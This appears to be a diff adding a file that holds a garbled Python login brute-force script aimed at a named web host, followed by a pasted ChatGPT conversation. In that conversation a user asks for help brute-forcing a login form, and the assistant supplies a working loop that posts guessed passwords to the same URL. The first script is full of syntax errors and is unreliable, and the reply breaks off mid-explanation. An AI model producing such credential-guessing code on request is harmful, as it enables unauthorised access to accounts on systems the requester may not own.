@@ -1,0 +1,133 @@
+import request
+import string
+
+url = "https://vm1.atuda.co"
+
+characters = list(string.ascii_lowercase + string.digits)list(string.ascii_lowercase)
+
+username = "admin", "Admin", "root", "Root", "", " "
+password = "admin", "Admin", "password", "Password", "", " "
+
+for char in characters:
+    test_password = list(password) + char
+    print(f"Trying username: {username}, password: {test_password}")
+        
+    for username in username:
+        for password in password:
+        
+            data = { "username": username,
+                    "password": password
+                    }
+            response = requests.post(url, data=data)
+        
+    if response.StatusCode == 200 and succeed in responase..text.lower():
+        print("Greyt Success!!")
+else:
+    print("Something went wrong...")
+
+
+
+_______________________________________Chat GPT guide:___________________________________
+
+
+ChatGPT 4o mini
+
+Log in
+
+Sign up
+You said:
+making code in python to check my login form on my site for bruteforcing: 
+"import request
+import string
+
+url = "https://vm1.atuda.co"
+
+string.ascii_lowercase('abcdefghijklmnopqrstuvwxyz')
+list(string.ascii_lowercase)
+['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
+
+username = "student"
+password = "24242424"
+while len(password) < 11:
+    if password >= 100 and password <=999:
+        print(password)
+        password += 1
+        
+        
+for username in username:
+    for password in password:
+        
+        data = { "username": username,
+                "password": password
+                }
+        response = requests.post(url, data=data)"
+help me with the code by changing the list wiht letters from lower a to higher Z, then from 0 to 9, and than both.
+after, make a loop that tryying to implement 1 by 1 the list till succeed 
+ChatGPT said:
+ChatGPT
+To help you with this task, I'll go through your code step by step and modify it to:
+
+Create a list of characters from lowercase 'a' to 'z' and digits '0' to '9'.
+Try all combinations for the username and password fields.
+Send POST requests to your login form for each combination.
+Here’s the improved and corrected version of your code:
+
+Key Changes:
+Character set: The list of characters will include all lowercase letters ('a' to 'z') and digits ('0' to '9').
+Loop structure: The password will iterate through all combinations, starting with letters, then digits, and finally, combinations of both.
+Logic: I will modify the loop to properly generate the combinations of username and password for bruteforce testing.
+Updated Code:
+python
+Copy code
+import requests
+import string
+
+# Define the URL where you are testing the login form
+url = "https://vm1.atuda.co"
+
+# Create a character set that contains lowercase letters (a-z) and digits (0-9)
+characters = list(string.ascii_lowercase + string.digits)
+
+# Define the username you are trying to login with
+username = "student"
+
+# The password will start as an empty string
+password = ""
+
+# Loop through possible password combinations
+while len(password) < 11:  # We are testing passwords of up to length 10
+    for char in characters:
+        # Generate password combination by appending the character to the current password
+        test_password = password + char
+        print(f"Trying username: {username}, password: {test_password}")
+        
+        # Prepare the data to send in the POST request
+        data = {
+            "username": username,
+            "password": test_password
+        }
+
+        # Send the POST request to check the login
+        response = requests.post(url, data=data)
+
+        # Check if the response indicates a successful login (you might need to adjust the success criteria)
+        if response.status_code == 200 and "success" in response.text.lower():  # Adjust based on actual success indication
+            print(f"Success! Username: {username}, Password: {test_password}")
+            break  # Exit the loop if login is successful
+    else:
+        # If we completed one iteration of the inner loop without breaking, move to the next password length
+        password += characters[0]  # Add the first character to continue to the next level of brute-forcing
+        continue
+    break  # Exit the outer loop if we break from the inner loop (success)
+Explanation of Changes:
+Character set: The characters list now includes both lowercase letters (string.ascii_lowercase) and digits (string.digits), which provides all combinations of characters from a to z and 0 to 9.
+
+Password generation:
+
+The password is initially an empty string. We incrementally build the password by appending one character at a time to the string.
+The outer while loop checks that the password
+
+
+ChatGPT can make mistakes. Check important info.
+?
+ChatGPT is still generating a response...
